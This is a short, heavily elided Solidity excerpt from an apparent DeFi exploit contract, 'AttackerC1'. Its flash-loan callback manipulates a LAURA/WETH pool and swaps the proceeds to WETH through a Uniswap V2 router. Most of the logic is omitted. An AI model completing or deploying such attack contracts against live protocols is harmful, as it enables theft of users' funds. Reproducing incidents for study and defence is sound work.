...
contract AttackerC1 {
    ...
    function receiveFlashLoan(IERC20[] memory, uint256[] memory, uint256[] memory, bytes memory) external {
        ...
        LAURA, weth, bal2, MAGIC_NUMBER, 0, 0, address(this), type(uint256).max);
        ...
        LAURA, weth, bal3, 0, 0, address(this), type(uint256).max);
        ...
        path[1] = weth;
        IFS(uniV2Router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            bal4, 0, path, address(this), type(uint256).max
        );
